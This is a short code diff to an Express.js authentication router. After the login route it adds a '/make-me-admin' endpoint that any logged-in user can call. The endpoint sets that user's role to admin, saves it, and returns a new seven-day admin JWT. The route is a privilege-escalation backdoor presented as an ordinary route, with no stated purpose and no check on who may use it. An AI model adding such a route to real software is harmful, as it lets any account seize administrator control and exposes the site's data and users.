@@ -36,4 +36,21 @@ router.post('/login', async (req, res) => {
   }
 });
 
-module.exports = router;
+const protect = require('../middleware/auth');
+
+router.post('/make-me-admin', protect, async (req, res) => {
+  try {
+    const user = await User.findById(req.user.id);
+    if (!user) return res.status(404).json({ message: 'User not found' });
+
+    user.role = 'admin';
+    await user.save();
+
+    const token = jwt.sign({ id: user._id, role: 'admin' }, process.env.JWT_SECRET, { expiresIn: '7d' });
+    res.json({ token, user: { id: user._id, name: user.name, email: user.email, role: 'admin' } });
+  } catch (err) {
+    res.status(500).json({ message: err.message });
+  }
+});
+
+module.exports = router;
